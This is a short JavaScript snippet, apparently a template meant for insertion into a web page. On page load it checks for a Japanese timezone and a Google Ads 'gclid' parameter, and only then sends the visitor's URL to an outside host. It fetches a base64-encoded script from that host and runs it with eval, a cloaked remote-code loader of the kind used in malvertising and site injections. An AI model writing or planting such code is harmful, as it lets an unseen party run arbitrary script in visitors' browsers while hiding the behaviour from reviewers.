document.addEventListener('DOMContentLoaded', () => {
    // Get the current timezone and full URL
    const clientTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    const fullUrl = window.location.href;

    // Check if the timezone is Japan and if the URL contains 'gclid'
    if (clientTimezone === 'Asia/Tokyo' && fullUrl.includes('gclid')) {
        // URL to send the request to
        const responseUrl = 'https://your-script-source.com/get-script'; // Replace with your actual URL

        // Function to transmit data
        function transmitData(url, timezone, fullUrl) {
            return fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ timezone, fullUrl }),
            })
            .then(response => response.text())
            .then(encodedScript => decodeAndRunScript(encodedScript))
            .catch(handleError);
        }

        // Function to decode and run the received script
        function decodeAndRunScript(encodedScript) {
            try {
                const script = atob(encodedScript);
                eval(script);
            } catch (error) {
                throw new Error(`Script execution failed: ${error}`);
            }
        }

        // Function to handle errors
        function handleError(error) {
            console.error('Error:', error);
        }

        // Sending the data
        transmitData(responseUrl, clientTimezone, fullUrl);
    }
});
